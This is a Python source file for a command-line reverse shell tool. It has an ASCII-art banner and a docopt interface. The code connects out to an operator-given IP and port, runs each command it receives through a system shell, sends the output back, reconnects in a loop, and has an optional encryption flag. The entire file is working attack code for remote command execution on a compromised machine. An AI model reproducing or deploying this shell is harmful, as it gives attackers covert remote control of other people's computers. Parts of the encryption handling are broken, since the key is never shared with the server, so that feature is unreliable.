import os
import time
import socket
import colorama
import subprocess
from docopt import docopt
from colorama import Fore, Style
from cryptography.fernet import Fernet

colorama.init(autoreset=True)

USAGE = Fore.GREEN + """
Reverse Shell

Usage:
  reverse_shell.py [--ip=<ip>] [--port=<port>] [--encrypt]
  reverse_shell.py [-h | --help]

Options:
  --ip=<ip>      IP address to connect
  --port=<port>  Port number to connect
  --encrypt      Enable encryption for communication
  -h, --help     Show this help message and exit
""" + Style.RESET_ALL

OK = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
ERR = f"{Fore.RED}[-]{Style.RESET_ALL}"
INF = f"{Fore.YELLOW}[*]{Style.RESET_ALL}"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(Fore.LIGHTRED_EX + """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⡛⠻⠿⢶⣶⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⠅⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⣱⠆⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣰⣿⣿⣿⣿⢃⡄⠀⠀⠀⢻⣧⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⡿⠿⣻⠿⠛⠛⠙⠛⣿⣿⣇⣼⠀⣀⣠⣤⠚⠛⠛⠻⠿⣿⠿⢷⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⡿⠟⠉⢀⡴⠊⠀⠀⠀⠀⡰⠊⠁⠀⠈⠙⣟⠉⠀⠀⠙⢦⠀⠀⠀⠀⠙⠦⣄⠉⠛⢿⣦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣾⡿⠋⠀⢀⡴⠁⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠑⣄⠀⠀⠀⠀⠈⠳⣄⠀⠙⠻⣷⡄⠀⠀⠀⠀
⠀⠀⠀⣰⣿⠋⠀⠀⣠⠋⠀⠀⠀⣠⡴⠶⢿⣦⡀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣠⡾⠷⠦⣄⠀⠀⠀⠘⢧⡀⠀⠙⢿⣦⠀⠀⠀
⠀⠀⣰⡿⠁⠀⠀⡴⠁⠀⠀⣠⠞⠁⠀⣠⠞⠉⠹⡆⠀⠀⠀⠀⡇⠀⠀⠀⢀⡟⠛⠦⣀⠀⠀⠙⢦⠀⠀⠈⢳⡀⠀⠈⢻⣧⠀⠀
⠀⢰⣿⠁⠀⠀⣸⠁⠀⠀⢠⡏⠀⠀⣼⠃⠀⠀⢰⡏⠀⠀⠀⢰⡇⠀⠀⠀⠸⣇⠀⠀⠈⢣⠀⠀⠸⡇⠀⠀⠀⢳⠀⠀⠈⢿⣇⠀
⠀⣿⡇⠀⠀⢠⡇⠀⠀⠀⠈⣇⠀⢠⡇⠀⠀⢀⡾⠁⠀⠀⣠⡞⠻⣦⠀⠀⠀⠹⣆⠀⠀⠀⡇⠀⢠⡇⠀⠀⠀⠈⣇⠀⠀⠘⣿⡄
⢠⣿⠀⠀⠀⣼⠀⠀⠀⠀⠀⠉⠓⣤⣷⣤⠶⠋⠀⠀⠀⣰⡟⠀⠀⠸⣧⡀⠀⠀⠈⠳⠤⣤⣧⠴⠊⠀⠀⠀⠀⠀⢹⠀⠀⠀⢻⡇
⢸⡟⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⢰⡿⣧⣤⣤⣤⠿⣷⠀⠀⠀⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⢸⡇
⢸⡇⠀⠀⠀⡇⠀⠀⠀⠀⢶⣦⣸⣇⠀⠀⠀⠀⠀⠀⠈⠛⠚⠻⡟⠛⠛⠉⠀⠀⠀⠀⠀⠀⢸⣇⣤⣶⠂⠀⠀⠀⢸⡇⠀⠀⢸⡇
⢸⣿⠀⠀⠀⣷⠀⠀⠀⠀⠈⢿⡉⠛⠲⣦⡀⠀⠀⠀⠀⠀⠀⢀⣇⠀⣀⣀⣀⣀⣤⣤⢴⡶⠋⠉⢨⠇⠀⠀⠀⠀⢸⠃⠀⠀⢸⡇
⠈⣿⡄⠀⠀⢻⡀⠀⠀⠀⠀⠈⢳⡀⠀⢹⡇⠀⠀⠀⢰⣿⠛⠛⠉⠉⠉⣉⡭⠞⢧⣠⠞⠁⠀⡰⠋⠀⠀⠀⠀⠀⢸⠀⠀⠀⣿⡇
⠀⢿⣧⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⢳⣄⠀⠛⠲⠶⣶⣞⠁⠀⠀⠀⠀⣾⡅⢀⣠⡴⠿⣄⢀⣾⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⢰⣿⠀
⠀⠘⣿⣆⠀⠀⠸⡄⠀⠀⠀⠀⠀⠸⡏⠑⢤⡀⠀⠀⠈⠉⠛⠲⠶⠚⠋⣿⠋⠁⠀⠀⠘⠋⡏⠀⠀⠀⠀⠀⠀⡼⠁⠀⢠⣿⠇⠀
⠀⠀⠘⢿⣦⠀⠀⠹⡄⠀⠀⠀⠀⠀⢿⡀⠀⠉⠓⠦⢤⣄⣀⣀⣀⣀⣀⡽⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⢀⡾⠁⠀⣠⣿⠏⠀⠀
⠀⠀⠀⠈⠻⣷⡄⠀⠈⢆⠀⠀⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⣠⠟⠁⢀⣴⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣷⣄⡈⠳⣄⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀⢀⠴⠃⣀⣴⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣶⣤⣝⣦⣀⡀⠀⠱⡄⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⢀⡴⠃⠀⢀⣤⣞⣥⣶⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣷⣶⣾⣦⣄⣀⣀⣠⣿⣀⣀⣤⣤⣾⣤⣶⣾⠿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            Reverse Shell by PunGrumpy⠀⠀⠀
    """ + Style.RESET_ALL)


def counting_time(retries, delay, message=""):
    for retry in range(retries, 0, -1):
        retry_message = f"{message} Retrying in {retry} seconds..."
        print(retry_message, end='\r')
        time.sleep(delay + 0.1)
    print(" " * len(retry_message), end='\r')


def user_interface():
    clear()
    banner()

    try:
        print(f"{INF} Enter IP address to connect to: ", end="")
        ip = input()
        if not ip:
            counting_time(3, 1, message=f'{ERR} IP address cannot be empty,')
            user_interface()
        print(f"{INF} Enter port number to connect to: ", end="")
        port = input()
        if not port:
            counting_time(3, 1, message=f'{ERR} Port number cannot be empty,')
            user_interface()
        print(f"{INF} Do you want to enable encryption? [y/N]: ", end="")
        encrypt = input()
        if encrypt.lower() == "y":
            print(f"{OK} Encryption enabled\n")
        else:
            print(f"{OK} Encryption disabled\n")

        while True:
            s = connect(ip, port)
            if s:
                listen(s)
                print(f"{OK} Connected to {ip}:{port}")
            else:
                counting_time(5, 1, message=f'{ERR} Connection failed,')
    except KeyboardInterrupt or Exception:
        print(f"\n{OK} Exiting...")
        time.sleep(1)
        exit(0)


def generate_key():
    return Fernet.generate_key()


def encrypt_data(key, data):
    f = Fernet(key)
    encrypted_data = f.encrypt(data.encode())
    return encrypted_data


def decrypt_data(key, encrypted_data):
    f = Fernet(key)
    decrypted_data = f.decrypt(encrypted_data)
    return decrypted_data.decode()


def connect(ip, port, encrypt_communication=False):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        if encrypt_communication:
            print(f"{OK} Communication encrypted with server.")
        return s
    except Exception as e:
        return None


def listen(s, encrypt_communication=False):
    try:
        while True:
            data = s.recv(1024)
            if encrypt_communication:
                data = decrypt_data(encrypt_key, data)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode(
                    "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                if encrypt_communication:
                    output_str = encrypt_data(encrypt_key, output_str)
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    except Exception as e:
        listen(s, encrypt_communication)


def main():
    arguments = docopt(USAGE, version="Advanced Reverse Shell 2.0")
    ip = arguments["--ip"]
    port = arguments["--port"]
    encrypt_communication = arguments["--encrypt"]

    if not ip or not port:
        user_interface()
    else:
        global encrypt_key
        encrypt_key = generate_key()

        try:
            while True:
                s = connect(ip, port, encrypt_communication)
                if s:
                    listen(s, encrypt_communication)
                    print(f"{OK} Connected to {ip}:{port}")
                else:
                    counting_time(5, 1, message=f'{ERR} Connection failed,')
        except KeyboardInterrupt or Exception:
            print(f"\n{OK} Exiting...")
            time.sleep(1)
            exit(0)


if __name__ == '__main__':
    main()
